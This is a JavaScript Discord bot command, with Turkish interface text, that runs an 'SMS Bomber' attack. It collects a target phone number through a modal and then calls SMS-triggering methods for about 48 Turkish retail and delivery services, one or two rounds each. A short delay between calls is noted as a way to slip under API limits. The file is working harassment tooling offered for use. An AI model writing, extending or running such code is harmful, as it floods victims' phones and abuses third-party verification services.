const { Client, CommandInteraction, MessageEmbed, MessageActionRow, MessageButton, Modal, TextInputComponent } = require("discord.js");
const { createDatabase } = require("whisky.db");
const db = new createDatabase();
const ms = require("parse-ms");
const { SmsBomber } = require("../../whiskylorean/sms.js");

module.exports = {
    name: "sms-bomber",
    description: "Hedef numaraya SMS Bomber saldırısı başlatır.",
    type: 'CHAT_INPUT',
    /**
     *
     * @param {Client} client
     * @param {CommandInteraction} interaction
     * @param {String[]} args
     */
    run: async (client, interaction, args) => {
        const config = client.config;

        if (!interaction.member.roles.cache.has(config.gerekliRolId)) {
            return interaction.reply({
                embeds: [new MessageEmbed().setAuthor("Hata!", interaction.user.displayAvatarURL({ dynamic: true })).setDescription("Bu komutu kullanmak için gerekli role sahip değilsin!").setColor("RED")],
                ephemeral: true
            });
        }

        const row = new MessageActionRow()
            .addComponents(
                new MessageButton()
                .setCustomId('start_sms_modal')
                .setLabel('Saldırıyı Başlat')
                .setStyle('SECONDARY')
                .setEmoji('🚀'),
                new MessageButton()
                .setCustomId('cancel_operation')
                .setLabel('İptal Et')
                .setStyle('DANGER')
                .setEmoji('✖️')
            );

        await interaction.reply({
            content: "SMS Bomber saldırısını yapılandırmak için butona tıklayın.",
            components: [row],
            ephemeral: true
        });

        const filter = i => i.user.id === interaction.user.id;
        const collector = interaction.channel.createMessageComponentCollector({ filter, time: 60000 });

        collector.on('collect', async i => {
            if (i.customId === 'cancel_operation') {
                await i.update({ content: 'İşlem kullanıcı tarafından iptal edildi.', components: [] });
                collector.stop();
                return;
            }

            if (i.customId === 'start_sms_modal') {
                const modal = new Modal()
                    .setCustomId('sms_bomber_modal')
                    .setTitle('SMS Bomber Saldırısı');

                const telNoInput = new TextInputComponent()
                    .setCustomId('tel-no')
                    .setLabel("Telefon Numarası (Örn: 5551234567)")
                    .setStyle('SHORT')
                    .setRequired(true)
                    .setMinLength(10)
                    .setMaxLength(10);

                const modInput = new TextInputComponent()
                    .setCustomId('mod')
                    .setLabel("Gönderim Modu ('tekli' veya 'cift')")
                    .setStyle('SHORT')
                    .setRequired(true);

                const firstActionRow = new MessageActionRow().addComponents(telNoInput);
                const secondActionRow = new MessageActionRow().addComponents(modInput);

                modal.addComponents(firstActionRow, secondActionRow);
                await i.showModal(modal);

                const modalFilter = (modalInteraction) => modalInteraction.customId === 'sms_bomber_modal' && modalInteraction.user.id === interaction.user.id;
                
                try {
                    const modalInteraction = await i.awaitModalSubmit({ filter: modalFilter, time: 60000 });

                    const tel = modalInteraction.fields.getTextInputValue('tel-no');
                    const gonderim = modalInteraction.fields.getTextInputValue('mod').toLowerCase();
                    
                    const regex = /^[5][0-9]{9}$/;
                    let timeout = 60000;

                    let beklelan = db.get(`smscool_${interaction.user.id}`);
                    if (beklelan !== null && timeout - (Date.now() - beklelan) > 0) {
                        return modalInteraction.reply({ embeds: [new MessageEmbed().setAuthor("Hata!", interaction.user.displayAvatarURL({ dynamic: true })).setDescription(`Bu komutu tekrar kullanmak için **${ms(timeout - (Date.now() - beklelan)).seconds}** saniye bekle!`).setColor("RED")], ephemeral: true });
                    }
                    if (!regex.test(tel)) {
                        return modalInteraction.reply({ embeds: [new MessageEmbed().setAuthor("Hata!", interaction.user.displayAvatarURL({ dynamic: true })).setDescription("Geçersiz telefon numarası! Numarayı 10 haneli ve 5 ile başlayacak şekilde girin. Örnek: 5551234567").setColor("RED")], ephemeral: true });
                    }
                    if (gonderim !== 'tekli' && gonderim !== 'cift') {
                         return modalInteraction.reply({ embeds: [new MessageEmbed().setAuthor("Hata!", interaction.user.displayAvatarURL({ dynamic: true })).setDescription("Geçersiz gönderim modu! Sadece `tekli` veya `cift` yazabilirsiniz.").setColor("RED")], ephemeral: true });
                    }

                    const attackId = interaction.id;
                    const cancelRow = new MessageActionRow()
                        .addComponents(
                            new MessageButton()
                                .setCustomId(`cancel_attack_${attackId}`)
                                .setLabel('Saldırıyı İptal Et')
                                .setStyle('DANGER')
                        );

                    await modalInteraction.reply({ 
                        embeds: [new MessageEmbed().setAuthor("Başlatılıyor...", interaction.user.displayAvatarURL({ dynamic: true })).setDescription(`:white_check_mark: SMS Bomber saldırısı başlatılıyor! \n:telephone: Hedef Numara: ||**${tel}**|| \n🎯 Gönderim Modu: ${gonderim === 'tekli' ? "Tekli Gönderim" : "Çift Gönderim"}`).setColor("GREEN")], 
                        components: [cancelRow],
                        ephemeral: true 
                    });

                    const sms = new SmsBomber(tel, modalInteraction, gonderim);
                    client.activeAttacks.set(attackId, sms);

                    if (client.config.log) {
                        client.channels.cache.get(client.config.logKanalId).send(`<@${interaction.user.id}> - **${interaction.user.username}** - **${interaction.user.id}** SMS Bomber komutunu kullandı. Numara: **||${tel}||** Gönderim Modu: **${gonderim === 'tekli' ? "Tekli Gönderim" : "Çift Gönderim"}**`);
                    }

                    db.set(`smscool_${interaction.user.id}`, Date.now());

                    const services = ['kahveDunyasi', 'wmf', 'bim', 'englishHome', 'icq', 'suIste', 'kimGb', 'tazi', 'hey', 'biSu', 'ucDortBes', 'macro', 'tiklaGelsin', 'altinYildiz', 'naosStars', 'isteGelsin', 'hayatSu', 'evIdea', 'koton', 'hizliEcza', 'metro', 'qumpara', 'ipragaz', 'migros', 'paybol', 'fileMarket', 'joker', 'akasya', 'akbati', 'clickMe', 'happy', 'komagene', 'kuryemGelsin', 'porty', 'taksim', 'tasdelen', 'tasimacim', 'uysal', 'yapp', 'yilmazTicaret', 'yuffi', 'starbucks', 'pidem', 'baydoner', 'frink', 'bodrum', 'hoplaGit', 'n11'];
                    
                    const runAttack = async () => {
                        const attackPromises = [];
                        const loopCount = gonderim === 'cift' ? 2 : 1;

                        for (let i = 0; i < loopCount; i++) {
                            for (const service of services) {
                                if (sms.isCancelled()) break;
                                attackPromises.push(sms[service]());
                                await new Promise(resolve => setTimeout(resolve, 50)); // Servisler arasına küçük bir gecikme ekleyerek API limitlerini aşma riskini azaltır.
                            }
                            if (sms.isCancelled()) break;
                        }
                        await Promise.all(attackPromises);

                        if (client.activeAttacks.has(attackId)) {
                             await modalInteraction.editReply({ content: "Saldırı tamamlandı.", embeds:[], components: [] });
                             client.activeAttacks.delete(attackId);
                        }
                    };
                    
                    runAttack();

                } catch (err) {
                    console.error("Modal bekleme hatası:", err);
                    await i.update({ content: 'Süre dolduğu için işlem iptal edildi.', components: [] });
                }
            }
        });

        collector.on('end', collected => {
            if (collected.size === 0) {
                 interaction.editReply({ content: 'Süre dolduğu için işlem iptal edildi.', components: [] });
            }
        });
    },
};
                             
